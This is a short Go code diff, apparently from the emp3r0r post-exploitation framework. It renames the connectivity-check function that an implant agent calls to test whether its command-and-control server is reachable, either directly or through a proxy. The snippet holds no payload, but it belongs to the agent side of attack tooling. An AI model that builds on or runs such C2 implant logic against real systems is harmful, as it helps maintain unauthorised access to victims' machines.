@@ -29,11 +29,11 @@ func isAgentAliveSocket() bool {
 
 func isC2Reachable() bool {
 	if !agent.RuntimeConfig.DisableNCSI {
-		return tun.HasInternetAccess(tun.UbuntuConnectivityURL, agent.RuntimeConfig.C2TransportProxy)
+		return tun.TestConnectivity(tun.UbuntuConnectivityURL, agent.RuntimeConfig.C2TransportProxy)
 	}
 
 	log.Println("NCSI is disabled, trying direct C2 connection")
-	return tun.HasInternetAccess(emp3r0r_data.CCAddress, agent.RuntimeConfig.C2TransportProxy)
+	return tun.TestConnectivity(emp3r0r_data.CCAddress, agent.RuntimeConfig.C2TransportProxy)
 }
 
 // AgentWaitQueue list of agents waiting to run
